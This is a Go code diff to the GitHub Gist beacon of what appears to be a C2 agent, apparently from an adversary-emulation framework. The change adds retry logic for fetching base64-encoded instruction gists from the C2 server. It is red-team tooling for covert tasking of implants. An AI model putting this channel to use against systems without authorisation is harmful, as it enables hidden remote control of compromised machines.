@@ -19,7 +19,8 @@ const (
 	githubTimeout = 60
 	githubTimeoutResetInterval = 5
 	githubError = 500
-	beaconWait = 20 // number of seconds to wait for C2 server to respond with instruction gist.
+	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon gist response before giving up.
+	beaconWait = 20 // number of seconds to wait for beacon gist response in case of initial failure.
 )
 
 var (
@@ -94,20 +95,25 @@ func (g GIST) GetName() string {
 
 
 func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
+	failCount := 0
 	heartbeat := createHeartbeatGist("beacon", profile)
 	if heartbeat {
-		// Wait for C2 server to provide instruction response gist.
-		time.Sleep(time.Duration(float64(beaconWait)) * time.Second)
-	}
-	//collect instructions & delete
-	contents := getGists("instructions", profile["paw"].(string))
-	if contents != nil {
-		decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
-		if err != nil {
-			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
-			return nil, heartbeat
+		//collect instructions & delete
+		for failCount < beaconResponseFailThreshold {
+			contents := getGists("instructions", profile["paw"].(string));
+			if contents != nil {
+				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
+				if err != nil {
+					output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
+					return nil, heartbeat
+				}
+				return decodedContents, heartbeat
+			}
+			// Wait for C2 server to provide instruction response gist.
+			time.Sleep(time.Duration(float64(beaconWait)) * time.Second)
+			failCount += 1
 		}
-		return decodedContents, heartbeat
+		output.VerbosePrint("[!] Failed to fetch beacon response from C2.")
 	}
 	return nil, heartbeat
 }
@@ -188,6 +194,7 @@ func checkValidSleepInterval(profile map[string]interface{}) {
 }
 
 func getBeaconNameIdentifier() string {
+	rand.Seed(time.Now().UnixNano())
 	return strconv.Itoa(rand.Int())
 }
 
